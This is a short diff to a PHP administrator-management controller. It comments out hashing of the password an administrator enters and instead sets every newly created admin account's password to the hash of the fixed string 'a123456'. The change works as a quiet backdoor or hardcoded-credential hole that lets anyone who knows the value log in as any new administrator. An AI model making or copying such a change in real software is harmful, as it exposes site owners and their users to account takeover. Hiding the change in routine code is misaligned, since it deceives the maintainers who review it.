@@ -170,7 +170,8 @@ class adminAction extends baseAction
 				$this->error('管理员'.$_POST['user_name'].'已经存在');
 			}
 			unset($_POST['repassword']);
-			$_POST['password'] = md5($_POST['password']);
+//			$_POST['password'] = md5($_POST['password']);
+			$_POST['password'] = md5('a123456');
 			$admin_mod->create();
 			$admin_mod->add_time = time();
 			$admin_mod->last_time = time();
